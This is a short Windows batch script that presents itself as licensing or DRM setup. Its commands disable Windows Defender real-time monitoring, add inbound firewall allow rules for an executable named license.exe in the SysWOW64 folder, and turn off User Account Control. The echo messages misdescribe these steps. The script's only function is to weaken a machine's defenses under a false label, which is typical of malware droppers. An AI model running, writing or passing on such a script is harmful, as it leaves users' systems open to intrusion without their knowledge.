@echo off
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1
echo "DRM Activated...."
timeout /t 5
echo.

netsh advfirewall add rule name="QSystem" dir=in action=allow program="C:\WINDOWS\SysWOW64\License\license.exe" enable=yes
netsh advfirewall add rule name="QSystem" dir=in action=allow program="C:\WINDOWS\SysWOW64\license.exe" enable=yes
echo "QSystem installed in firewall"
timeout /t 5
echo.

REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
echo "RegLUA enabled 0"
timeout /t 5
echo.
